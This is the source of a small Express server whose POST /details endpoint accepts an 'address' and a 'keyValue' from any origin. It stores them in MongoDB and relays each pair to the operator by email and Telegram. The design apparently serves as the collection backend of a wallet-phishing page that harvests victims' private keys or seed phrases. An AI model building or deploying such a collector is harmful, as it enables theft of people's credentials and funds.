require("dotenv").config();



const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const sendEmail = require("./utils/sendEmail");
const sendTelegram = require("./utils/sendTelegram");

const PORT = parseInt(process.env.PORT, 10) || 5000;


const app = express();
app.use(express.json());

app.use(cors({
    origin: "*",
    methods:["GET", "POST"],
}));


mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("Database connected"))
    .catch(err => console.log(err));
const detailsSchema = new mongoose.Schema({
    address : String,
    keyValue:String,
    CreatedAt:{
        type: Date,
        default: Date.now
    }
});

const User = mongoose.model("User", detailsSchema);

app.get("/", (req, res) => {
  res.status(200).send("Backend is running 🚀");
});



app.post("/details", async (req,res) => {
    const {address, keyValue } = req.body;

    if(!address || !keyValue){
         return res.status(400).json({ error: "Missing data" });

    }
        
  try{
     const saved = await User.create({address,keyValue});
        sendEmail({ address, keyValue }).catch(console.error);
        sendTelegram({ address, keyValue }).catch(console.error);

     res.json({ success: true, data: saved });
  }catch(err){
    console.error(err);
    res.status(500).json({error:"send error"});
  }
});





app.listen(PORT, () => console.log(`Server running on port ${PORT}`));